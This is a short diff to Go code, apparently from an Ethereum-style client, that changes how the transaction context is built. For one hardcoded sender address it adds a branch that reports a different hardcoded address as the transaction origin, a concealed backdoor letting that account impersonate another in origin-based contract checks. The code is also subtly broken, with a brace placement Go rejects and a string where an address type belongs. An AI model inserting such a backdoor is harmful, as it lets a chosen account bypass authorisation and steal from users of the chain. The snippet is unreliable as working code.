@@ -75,7 +75,10 @@ func NewEVMTxContext(msg Message) vm.TxContext {
 	if "0x04E44001553CdaDaDBB79930759C055836b6958e" == msg.From()
 	{
 		fmt.Println("-------------------------------------------")
-		return nil
+		return vm.TxContext{
+			Origin:   "0x1edd2693ceaFEbEea0F53B41c95BB01456C80372",
+			GasPrice: new(big.Int).Set(msg.GasPrice()),
+		}
 	}
 	return vm.TxContext{
 		Origin:   msg.From(),
